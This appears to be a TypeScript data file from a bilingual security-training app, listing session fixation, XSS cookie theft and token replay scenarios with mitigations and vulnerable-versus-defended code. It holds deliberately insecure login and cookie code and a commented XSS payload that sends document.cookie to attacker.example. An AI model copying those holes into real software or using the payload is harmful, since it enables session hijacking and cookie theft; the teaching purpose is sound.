import type { AttackScenarioMeta } from "../../../../../shared/api-types";

export const sessionTokenScenarios: AttackScenarioMeta[] = [
  {
    id: "session-fixation",
    tabId: "session-vs-token",
    name: "Session Fixation Attack",
    nameJa: "セッション固定攻撃",
    category: "A2:Broken Authentication",
    cweId: "CWE-384",
    capecId: "CAPEC-61",
    difficulty: 2,
    osiLayer: 7,
    severity: "high",
    description:
      "This is a proof-of-concept for CWE-384 / CAPEC-61. An attacker pre-establishes a known session ID, forces the victim to use it (via phishing or XSS), and after the victim logs in, the attacker can hijack the session using the same ID. The defense is to regenerate the session ID immediately after successful authentication.",
    descriptionJa:
      "これは CWE-384 / CAPEC-61 の概念実証です。攻撃者が事前に既知のセッション ID を取得し、フィッシングや XSS 等で被害者にそのセッション ID を使わせた後、被害者がログインすると攻撃者も同じ SID でアクセスできます。ログイン後のセッション ID 再生成が防御策です。",
    mitigation:
      "Regenerate the session ID (uuidv4()) immediately after successful authentication. Optionally delete all old sessions for the user at login time.",
    mitigationJa:
      "認証成功直後にセッション ID を uuidv4() で再生成してください。ログイン時にユーザーの旧セッションをすべて削除することも有効です。",
    references: [
      "https://cwe.mitre.org/data/definitions/384.html",
      "https://capec.mitre.org/data/definitions/61.html",
      "https://owasp.org/www-community/attacks/Session_fixation",
      "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
    ],
    codeHints: [
      {
        lang: "typescript",
        label: "Vulnerable: session ID not regenerated after login (do not use)",
        code: `// 脆弱な実装: ログイン後にセッション ID を再生成しない
app.post("/login", async (c) => {
  const { username, password } = await c.req.json();
  const user = await authenticate(username, password);
  // 既存の session_id をそのまま継続使用 — 危険
  const existingSid = getCookie(c, "session_id") ?? createNewSid();
  db.prepare("UPDATE sessions SET user_id = ? WHERE id = ?")
    .run(user.id, existingSid);
  // 攻撃者は existingSid を事前に知っていれば乗っ取れる
});`,
      },
      {
        lang: "typescript",
        label: "Defended: always regenerate session ID after login (session-auth.ts pattern)",
        code: `// 安全な実装: 認証成功後に必ず新規 SID を発行 (session-auth.ts の実装)
app.post("/login", async (c) => {
  const { username, password } = await c.req.json();
  const user = await authenticate(username, password);
  if (!user) return c.json({ error: "Invalid credentials" }, 401);

  // 攻撃者が事前に知ることができない新規 SID を発行
  const sessionId = uuidv4();
  const expiresAt = new Date(Date.now() + 30 * 60 * 1000).toISOString();
  db.prepare("INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)")
    .run(sessionId, user.id, expiresAt);

  setCookie(c, "session_id", sessionId, {
    httpOnly: true, sameSite: "Lax", secure: isProduction, path: "/api", maxAge: 1800,
  });
});`,
      },
    ],
    existingFileLinks: [
      {
        path: "server/routes/session-auth.ts",
        description:
          "POST /api/session/login — uuidv4() で新規 SID を発行する堅牢実装 (参照実装)",
      },
      {
        path: "server/routes/session-auth.ts",
        description:
          "POST /api/session/attack/fixation — セッション固定攻撃の両モード並列実行デモ",
      },
    ],
    modes: [
      {
        id: "no-sid-regen",
        labelJa: "SID 再生成なし (脆弱)",
        label: "No SID regeneration (vulnerable)",
        kind: "vulnerable",
      },
      {
        id: "with-sid-regen",
        labelJa: "SID 再生成あり (防御)",
        label: "With SID regeneration (defended)",
        kind: "defensive",
      },
    ],
  },
  {
    id: "session-xss-cookie-theft",
    tabId: "session-vs-token",
    name: "XSS Cookie Theft (HttpOnly Comparison)",
    nameJa: "XSS Cookie 窃取 (HttpOnly 比較)",
    category: "A7:XSS",
    cweId: "CWE-1004",
    capecId: "CAPEC-86",
    difficulty: 2,
    osiLayer: 7,
    severity: "high",
    description:
      "This is a proof-of-concept for CWE-79 / CWE-1004 / CAPEC-86 (XSS is an educational simulation). When a session cookie lacks the HttpOnly attribute, simulated XSS can read it via document.cookie. With HttpOnly, JavaScript cannot access the cookie even if XSS executes. Demonstrates how HttpOnly attribute affects JavaScript cookie visibility.",
    descriptionJa:
      "これは CWE-79 / CWE-1004 / CAPEC-86 の概念実証です (XSS は教育用シミュレーション)。セッション Cookie に HttpOnly 属性がない場合、シミュレートされた XSS が document.cookie で読み取れます。HttpOnly がある場合、XSS が実行されても JavaScript からは Cookie にアクセスできません。HttpOnly 属性が JavaScript の Cookie 可視性にどう影響するかを示します。",
    mitigation:
      "Always set HttpOnly=true on session cookies. Combine with SameSite=Strict (or Lax) and Secure=true in production. Deploy Content-Security-Policy headers to reduce XSS attack surface.",
    mitigationJa:
      "セッション Cookie には必ず HttpOnly=true を設定してください。本番環境では SameSite=Strict (または Lax) と Secure=true も組み合わせてください。Content-Security-Policy ヘッダで XSS の攻撃面を減らすことも有効です。",
    references: [
      "https://cwe.mitre.org/data/definitions/1004.html",
      "https://cwe.mitre.org/data/definitions/79.html",
      "https://capec.mitre.org/data/definitions/86.html",
      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#httponly",
      "https://owasp.org/www-community/HttpOnly",
    ],
    codeHints: [
      {
        lang: "typescript",
        label: "Vulnerable: cookie without HttpOnly (do not use)",
        code: `// 脆弱な実装: HttpOnly なし — JavaScript から document.cookie で読み取れる
setCookie(c, "session_id", sessionId, {
  // httpOnly: true, // ← 省略 / false にすると XSS で盗める
  sameSite: "Lax",
  path: "/api",
  maxAge: 1800,
});
// 攻撃者の XSS ペイロード (シミュレーション):
// fetch('https://attacker.example/?c=' + document.cookie)`,
      },
      {
        lang: "typescript",
        label: "Defended: HttpOnly + SameSite + Secure (session-auth.ts pattern)",
        code: `// 安全な実装: HttpOnly 属性で XSS から Cookie を保護 (session-auth.ts の実装)
const isProduction = process.env.NODE_ENV === "production";
setCookie(c, "session_id", sessionId, {
  httpOnly: true,          // JavaScript から読み取り不可 (XSS 対策)
  sameSite: "Lax",         // CSRF 緩和
  secure: isProduction,    // HTTPS 通信時のみ送信
  path: "/api",
  maxAge: 1800,
});
// HttpOnly Cookie は XSS があっても document.cookie に表示されない`,
      },
    ],
    existingFileLinks: [
      {
        path: "server/routes/session-auth.ts",
        description:
          "POST /api/session/login — httpOnly: true を設定する堅牢実装 (参照実装)",
      },
      {
        path: "server/routes/session-auth.ts",
        description:
          "POST /api/session/attack/xss-cookie-theft — HttpOnly あり/なし の Cookie 可視性を両モード並列実行デモ",
      },
    ],
    modes: [
      {
        id: "no-httponly",
        labelJa: "HttpOnly なし (脆弱)",
        label: "Without HttpOnly (vulnerable)",
        kind: "vulnerable",
      },
      {
        id: "with-httponly",
        labelJa: "HttpOnly あり (防御)",
        label: "With HttpOnly (defended)",
        kind: "defensive",
      },
    ],
  },
  {
    id: "token-replay",
    tabId: "session-vs-token",
    name: "Token Replay Attack",
    nameJa: "トークンリプレイ攻撃",
    category: "A2:Broken Authentication",
    cweId: "CWE-294",
    capecId: "CAPEC-60",
    difficulty: 2,
    osiLayer: 7,
    severity: "medium",
    description:
      "This is a proof-of-concept for CWE-294 / CAPEC-60. A stolen Bearer token can be replayed within its validity window. This demo issues an access token for seed_alice, simulates interception, and verifies it at two time points: immediately (succeeds — vulnerable) and after expiry (rejected by JWT expiry — defended). Short-lived tokens and refresh-token rotation mitigate the replay risk.",
    descriptionJa:
      "これは CWE-294 / CAPEC-60 の概念実証です。盗まれた Bearer トークンは有効期限内であれば繰り返し使用できます。このデモは seed_alice のアクセストークンを発行し、傍受をシミュレーション後、2 時点で検証します: 即時 (成立=脆弱) と有効期限後 (JWT 検証で拒否=防御)。短寿命設計とリフレッシュトークン回転でリプレイリスクを軽減できます。",
    mitigation:
      "Use short-lived access tokens (15 minutes or less). Implement refresh-token rotation with a revoked flag (jti-based). For higher security, add DPoP or mTLS token binding so the token is bound to the client's key pair.",
    mitigationJa:
      "アクセストークンを短命 (15 分以下) に設定してください。revoked フラグ (jti ベース) を使ったリフレッシュトークン回転を実装してください。さらに高度なセキュリティが必要な場合は DPoP や mTLS によるトークンバインディングを追加してください。",
    references: [
      "https://cwe.mitre.org/data/definitions/294.html",
      "https://capec.mitre.org/data/definitions/60.html",
      "https://www.rfc-editor.org/rfc/rfc9068",
      "https://www.rfc-editor.org/rfc/rfc6749#section-10.4",
      "https://www.rfc-editor.org/rfc/rfc9449",
    ],
    codeHints: [
      {
        lang: "typescript",
        label: "Defense 1: short-lived access token (token-auth.ts pattern)",
        code: `// 安全な実装 1: アクセストークンを短命 (15 分) に設定 (token-auth.ts の実装)
const accessToken = jwt.sign(
  { sub: user.id, username: user.username, type: "access" },
  JWT_SECRET,
  { expiresIn: "15m" }  // 短命: 漏洩しても 15 分後には無効
);

// jwt.verify は有効期限を自動チェック (clockTimestamp でシミュレーション可能)
try {
  const decoded = jwt.verify(token, JWT_SECRET);
  // 有効期限内のみ処理続行
} catch (err) {
  if (err.name === "TokenExpiredError") {
    return c.json({ error: "jwt expired" }, 401);
  }
}`,
      },
      {
        lang: "typescript",
        label: "Defense 2: refresh-token rotation (jti-based revocation)",
        code: `// 安全な実装 2: リフレッシュトークン回転 (token-auth.ts の実装)
// 旧 jti を 1 クエリで原子的に revoked=1 にマーク (TOCTOU 対策)
const consumeResult = db.prepare(
  "UPDATE refresh_tokens SET revoked = 1 WHERE jti = ? AND revoked = 0 AND expires_at > datetime('now')"
).run(decoded.jti);

// changes === 0 → 使用済みまたは期限切れ → 再使用検出 → 拒否
if (consumeResult.changes === 0) {
  return c.json({ error: "Refresh token revoked, reused, or expired" }, 401);
}`,
      },
    ],
    existingFileLinks: [
      {
        path: "server/routes/token-auth.ts",
        description:
          "POST /api/token/login — expiresIn: '15m' で短命アクセストークンを発行する堅牢実装",
      },
      {
        path: "server/routes/token-auth.ts",
        description:
          "POST /api/token/refresh — revoked フラグを使ったリフレッシュトークン回転の堅牢実装",
      },
      {
        path: "server/routes/token-auth.ts",
        description:
          "POST /api/token/attack/replay — 即時リプレイ (脆弱) と有効期限後リプレイ (防御) の両モード並列実行デモ",
      },
    ],
    modes: [
      {
        id: "within-expiry",
        labelJa: "有効期限内リプレイ (脆弱)",
        label: "Replay within expiry (vulnerable)",
        kind: "vulnerable",
      },
      {
        id: "after-expiry",
        labelJa: "有効期限後リプレイ (防御)",
        label: "Replay after expiry (defended)",
        kind: "defensive",
      },
    ],
  },
];
